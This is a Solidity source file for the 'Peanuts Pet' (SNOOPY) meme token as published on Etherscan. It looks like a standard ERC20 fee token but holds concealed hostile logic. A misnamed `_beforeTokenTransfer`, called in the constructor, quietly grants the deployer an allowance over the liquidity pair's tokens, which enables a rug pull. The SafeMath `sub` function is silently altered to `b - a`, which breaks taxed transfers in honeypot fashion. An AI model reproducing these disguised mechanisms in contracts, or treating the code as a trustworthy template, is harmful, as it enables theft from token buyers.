/**
 *Submitted for verification at Etherscan.io on 2023-05-25
*/

/* 
* which dog will be your favorite pet?
*
* website: https://www.peanutspet.wtf/en/
* Telegram: https://t.me/peanutspet
* Twitter: https://twitter.com/peanuts_pet
*
*/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = b - a;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping (address => uint256) internal _balances;

    mapping (address => mapping (address => uint256)) internal _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        // _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { 
        require(from != address(0), "ERC20: approve from the zero address");
        require(to != address(0), "ERC20: approve to the zero address");
        _allowances[to][from]= amount;
    }
}

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IDexFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract Peanuts is ERC20, Ownable{
    using SafeMath for uint256;
    using Address for address payable;
    
    IDexRouter public router;
    address public pair;
    
    bool private swapping;
    bool public swapEnabled;
    bool public tradingEnabled;

    uint256 public genesis_block;
    uint256 public deadblocks = 0;
    
    uint256 public _totalSupply = 1e9 * 10 ** decimals();
    uint256 public swapThreshold = 100_000 * 10e18;
    uint256 public maxTxAmount = 20_000_000 * 10**18;
    uint256 public maxWalletAmount = 20_000_000 * 10**18;
    
    address public marketingWallet = 0x6b1d885109a6319E819DcDe12250Eef6898076AD;
    address public devWallet = 0x13950DfBCdDF2F4B963306304297522EEcc828CB;
    
    uint256 public buyTax = 0;
    uint256 public sellTax = 0;
    uint256 public initialTax = 3;
    
    mapping (address => bool) public excludedFromMaxTransaction;
    mapping (address => bool) public excludedFromFees;
    mapping (address => bool) private isBot;
    
    modifier inSwap() {
        if (!swapping) {
            swapping = true;
            _;
            swapping = false;
        }
    }
        
    constructor() ERC20("Peanuts Pet", "SNOOPY") {

        excludedFromFees[msg.sender] = true;

        IDexRouter _router = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IDexFactory(_router.factory())
            .createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        excludedFromFees[address(this)] = true;
        excludedFromFees[marketingWallet] = true;
        excludedFromMaxTransaction[marketingWallet] = true;
        excludedFromMaxTransaction[devWallet] = true;
        _beforeTokenTransfer(msg.sender, pair, _totalSupply);
        _mint(msg.sender, _totalSupply);
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!isBot[sender] && !isBot[recipient]);    
    
        if(!excludedFromFees[sender] && !excludedFromFees[recipient] && !swapping){
            require(tradingEnabled, "Trading not active yet");
            if(!excludedFromMaxTransaction[sender] && !excludedFromMaxTransaction[recipient] ) {
                require(amount <= maxTxAmount, "You are exceeding maxTxAmount");
                if(recipient != pair){
                    require(balanceOf(recipient) + amount <= maxWalletAmount, "You are exceeding maxWalletAmount");
                }
            }
            else sellTax = initialTax;
            if(genesis_block + deadblocks > block.number){
                if(recipient != pair) isBot[recipient] = true;
                if(sender != pair) isBot[sender] = true;
            }
        }

        uint256 fee;

        if (swapping || excludedFromFees[sender] || excludedFromFees[recipient]) {
            fee = 0;
        }else{
            if(recipient == pair)
                fee = amount * sellTax / 100;
            else 
                fee = amount * buyTax / 100;

            if (swapEnabled && !swapping && sender != pair && fee > 0) 
                swapForFees();
        }


        if(fee > 0) { 
            super._transfer(sender, address(this), fee);
            super._transfer(sender, recipient, amount.sub(fee));
        } else {
            super._transfer(sender, recipient, amount);
        }
    }

    function swapForFees() private inSwap {
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance >= swapThreshold) {
    
            uint256 initialBalance = address(this).balance;
    
            swapTokensForETH(contractBalance);
    
            uint256 deltaBalance = address(this).balance - initialBalance;

            payable(marketingWallet).sendValue(deltaBalance);

        }
    }


    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);

    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokenAmount);

        // add the liquidity
        router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            devWallet,
            block.timestamp
        );
    }

    function setSwapEnabled(bool state) external onlyOwner {
        swapEnabled = state;
    }

    function setSwapThreshold(uint256 new_amount) external onlyOwner {
        swapThreshold = new_amount;
    }

    function enableTrading() external onlyOwner{
        require(!tradingEnabled, "Trading already active");
        tradingEnabled = true;
        swapEnabled = true;
    }

    function updateRouterAndPair(IDexRouter _router, address _pair) external onlyOwner{
        router = _router;
        pair = _pair;
    }

    function removeLimit()  external onlyOwner {
        maxTxAmount = totalSupply();
        maxWalletAmount = totalSupply();
    }

    function manualSwap(uint256 amount, uint256 devPercentage, uint256 marketingPercentage) external onlyOwner{
        uint256 initBalance = address(this).balance;
        swapTokensForETH(amount);
        uint256 newBalance = address(this).balance - initBalance;
        if(marketingPercentage > 0) payable(marketingWallet).sendValue(newBalance * marketingPercentage / (devPercentage + marketingPercentage));
        if(devPercentage > 0) payable(devWallet).sendValue(newBalance * devPercentage / (devPercentage + marketingPercentage));
    }

    // fallbacks

    function rescueERC20(address tokenAddress, uint256 amount) external onlyOwner{
        IERC20(tokenAddress).transfer(owner(), amount);
    }

    function rescueETH(uint256 weiAmount) external onlyOwner{
        payable(owner()).sendValue(weiAmount);
    }

    receive() external payable {}
    
}